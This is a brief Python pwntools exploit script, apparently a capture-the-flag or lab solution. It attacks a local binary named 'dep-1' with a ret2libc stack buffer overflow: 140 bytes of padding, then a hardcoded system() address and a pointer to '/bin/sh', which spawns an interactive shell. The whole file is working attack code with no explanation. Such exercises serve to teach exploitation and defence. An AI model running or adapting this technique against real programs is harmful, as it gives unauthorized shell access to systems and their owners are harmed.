#!/usr/bin/env python

from pwn import *

p = process("./dep-1")

# address of system is 0xf7e39da0
# sys_addr = "\xa0\x9d\xe3\f7"
sys_addr = p32(0xf7e39da0)

# /bin/sh is stored at 0xf7f5aa0b
# sh = "\x0b\xaa\xf5\xf7"
sh = p32(0xf7f5aa0b)

buf = "A" * 128 + "B"*12

print(p.recv())

p.sendline(buf + sys_addr + "B"*4 + sh)

p.interactive()
